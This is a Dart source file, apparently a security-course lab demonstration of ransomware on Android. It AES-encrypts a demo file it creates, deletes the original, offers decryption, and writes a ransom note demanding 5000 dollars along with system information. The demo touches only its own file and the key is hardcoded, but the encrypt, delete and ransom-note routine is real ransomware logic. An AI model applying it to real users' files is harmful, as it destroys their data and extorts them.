import 'dart:io';

import 'package:encrypt/encrypt.dart';

class DemoFileService {
  static const String demoFilePath =
      '/storage/emulated/0/Download/giant_step_demo.txt';

  static const String encryptedFilePath =
      '/storage/emulated/0/Download/giant_step_demo.txt.enc';

  static final Key _key = Key.fromUtf8(
    'GiantStepDemoKey1234567890123456',
  );

  static final IV _iv = IV.fromUtf8('GiantStepDemoIV1'); // exactly 16 bytes
  static File get demoFile => File(demoFilePath);

  static File get encryptedFile =>
      File(encryptedFilePath);

  static Future<bool> exists() async {
    return demoFile.exists();
  }

  static Future<void> createDemoFile() async {
    if (await demoFile.exists()) return;
    await demoFile.writeAsString('GIANT STEP Malware DEMO FILE - CSS Lab assignment 2');
  }

  static Future<void> encryptDemoFile() async {
    if (!await demoFile.exists()) {
      throw Exception('Demo file not found:\n$demoFilePath');
    }
  
    if (await encryptedFile.exists()) {
      // File is already encrypted – just skip
      return;
    }
  
    final bytes = await demoFile.readAsBytes();
  
    final encrypter = Encrypter(
      AES(_key, mode: AESMode.cbc),
    );
  
    final encrypted = encrypter.encryptBytes(bytes, iv: _iv);
  
    await encryptedFile.writeAsBytes(encrypted.bytes, flush: true);
  
    // Delete original only after encrypted copy is written
    await demoFile.delete();
  }

  static Future<void> decryptDemoFile() async {
    if (!await encryptedFile.exists()) {
      throw Exception(
        'Encrypted demo file not found.',
      );
    }

    final bytes =
        await encryptedFile.readAsBytes();

    final encrypter = Encrypter(
      AES(
        _key,
        mode: AESMode.cbc,
      ),
    );

    final encrypted =
        Encrypted(bytes);

    final decrypted =
        encrypter.decryptBytes(
      encrypted,
      iv: _iv,
    );

    await demoFile.writeAsBytes(
      decrypted,
      flush: true,
    );

    await encryptedFile.delete();
  }

  static Future<bool> isEncrypted() async {
    return encryptedFile.exists();
  }

    static const String manifestFilePath =
      '/storage/emulated/0/Download/ransomware_manifest.txt';

  static File get manifestFile => File(manifestFilePath);

  static Future<void> generateRansomwareManifest() async {
    final timestamp = DateTime.now().toIso8601String();

    final systemInfo =
        'OS: ${Platform.operatingSystem}\n'
        'OS Version: ${Platform.operatingSystemVersion}\n';

    final manifest = '''
==================================================
             RANSOMWARE MANIFEST
==================================================


1. ENCRYPTION INFORMATION
--------------------------------------------------
Encryption Timestamp:
$timestamp

Encryption Status:
giant_step_demo.txt FILE ENCRYPTED

2. FILES AFFECTED
--------------------------------------------------
Original Demo File:
$demoFilePath

Demo Encrypted File:
$encryptedFilePath

3. RECOVERY / DECRYPTION INFORMATION
--------------------------------------------------

Once you pay the ransom demand then I will provide you the decryption key and AES decryption code and use it to decrypt your file.

4. RANSOM DEMAND
--------------------------------------------------
DEMO RANSOM DEMAND: 5000 dollars

5. SYSTEM INFORMATION
--------------------------------------------------
$systemInfo

==================================================
        END OF DEMONSTRATION MANIFEST
==================================================
''';

    await manifestFile.writeAsString(
      manifest,
      flush: true,
    );
  }
}